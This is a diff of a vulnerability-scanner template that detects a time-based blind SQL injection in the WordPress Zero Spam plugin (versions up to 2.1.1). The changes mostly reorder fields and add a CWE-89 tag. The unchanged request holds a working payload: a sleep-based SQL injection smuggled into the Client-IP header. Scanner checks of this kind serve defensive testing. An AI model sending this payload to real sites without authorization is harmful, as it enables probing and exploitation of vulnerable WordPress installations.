@@ -1,5 +1,4 @@
 id: zero-spam-sql-injection
-
 info:
   name: WordPress Zero Spam <= 2.1.1 - Blind SQL Injection
   author: theamanrawat
@@ -10,25 +9,25 @@ info:
   reference:
     - https://wpscan.com/vulnerability/44cc8d59-9b45-46b7-afaf-894e4ba62dd5
     - https://wordpress.org/plugins/zero-spam/
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
     max-request: 1
-  tags: time-based-sqli,wpscan,wp,wp-plugin,wordpress,zero-spam,sqli,unauth,vuln
-
+    verified: true
+  tags: sqli,time-based-sqli,unauth,vuln,wordpress,wp,wp-plugin,wpscan,zero-spam
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - duration>=7
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains(body, "zerospam-js")
+        type: dsl
+    raw:
       - |
         @timeout: 10s
         GET / HTTP/1.1
         Host: {{Hostname}}
         Client-IP: '+(select(0)from(select(sleep(7)))v)+'
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=7'
-          - 'status_code == 200'
-          - 'contains(content_type, "text/html")'
-          - 'contains(body, "zerospam-js")'
-        condition: and
-
